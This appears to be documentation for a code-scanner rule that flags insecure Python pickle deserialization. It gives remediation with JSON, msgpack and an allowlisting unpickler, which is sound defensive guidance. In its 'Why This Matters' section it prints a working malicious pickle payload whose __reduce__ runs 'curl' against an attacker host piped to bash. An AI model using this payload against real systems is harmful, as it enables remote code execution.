---
title: "VNX-PY-003 – Insecure Deserialization with pickle"
description: "Detect use of Python's pickle and cPickle deserializers, which execute arbitrary code embedded in serialized data and have no safe way to load untrusted input."
---

## Overview

This rule flags calls to `pickle.load()`, `pickle.loads()`, `cPickle.load()`, and `cPickle.loads()`. The Python pickle format is a bytecode stream for a stack-based virtual machine. When Python deserializes a pickle stream it executes the bytecode, which means a malicious pickle payload can run arbitrary Python code — including importing modules, calling functions, and executing system commands — before your application logic ever sees the data. There is no option to safely load an untrusted pickle. This maps to [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html).

**Severity:** High | **CWE:** [CWE-502 – Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)

## Why This Matters

Pickle-based remote code execution is trivial to exploit. An attacker only needs to craft a Python object that implements `__reduce__` returning a callable and arguments. When Python deserializes this object it calls the callable automatically:

```python
# What a malicious pickle payload looks like when crafted
import pickle, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.example/shell | bash",))

payload = pickle.dumps(Exploit())
# Anyone calling pickle.loads(payload) executes the shell command
```

This payload is only a few bytes and trivially embeds in any data channel that uses pickle: file uploads, API responses, Redis cache entries, message queue messages, or ML model files. Unlike SQL injection or XSS, there is no input validation or escaping that makes pickle safe — the code executes before you can inspect the data.

## What Gets Flagged

Any `.py` file containing `pickle.load(`, `pickle.loads(`, `cPickle.load(`, or `cPickle.loads(`.

```python
# FLAGGED: loading from a file
with open("data.pkl", "rb") as f:
    obj = pickle.load(f)

# FLAGGED: loading from a network response
obj = pickle.loads(response.content)

# FLAGGED: loading from Redis cache
obj = pickle.loads(redis_client.get("session:" + session_id))

# FLAGGED: cPickle is equally unsafe
import cPickle
obj = cPickle.loads(data)
```

## Remediation

1. **Replace pickle with a safe serialization format.** For most use cases, JSON or MessagePack provides everything pickle does without code execution:

```python
import json

# SAFE: serialize to JSON
serialized = json.dumps({"key": "value", "count": 42})

# SAFE: deserialize from JSON — no code execution possible
data = json.loads(serialized)
```

```python
import msgpack  # pip install msgpack

# SAFE: compact binary format, no code execution
serialized = msgpack.packb({"key": "value"})
data = msgpack.unpackb(serialized, raw=False)
```

2. **If you must use pickle on data you do not control, implement a SafeUnpickler.** This restricts which classes can be instantiated during deserialization. Only classes you explicitly allow can appear in the pickle stream:

```python
import pickle
import io

SAFE_CLASSES = {
    ("builtins", "list"),
    ("builtins", "dict"),
    ("myapp.models", "UserProfile"),
}

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if (module, name) not in SAFE_CLASSES:
            raise pickle.UnpicklingError(
                f"Forbidden class: {module}.{name}"
            )
        return super().find_class(module, name)

# SAFER (but still prefer JSON): load with class allowlist
obj = SafeUnpickler(io.BytesIO(data)).load()
```

3. **For ML model files, use a format designed for safety.** See VNX-PY-013 for detailed guidance on `torch.load(..., weights_only=True)` and SafeTensors.

4. **Audit existing pickle usage.** Search for all `import pickle` and `import cPickle` statements in your codebase to find serialization code that feeds data back into pickle — both the write and read side need to be assessed.

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [Python docs – pickle security warning](https://docs.python.org/3/library/pickle.html#restricting-globals)
- [Python docs – json module](https://docs.python.org/3/library/json.html)
- [CAPEC-586: Object Injection](https://capec.mitre.org/data/definitions/586.html)
- [MITRE ATT&CK T1059.006 – Command and Scripting Interpreter: Python](https://attack.mitre.org/techniques/T1059/006/)
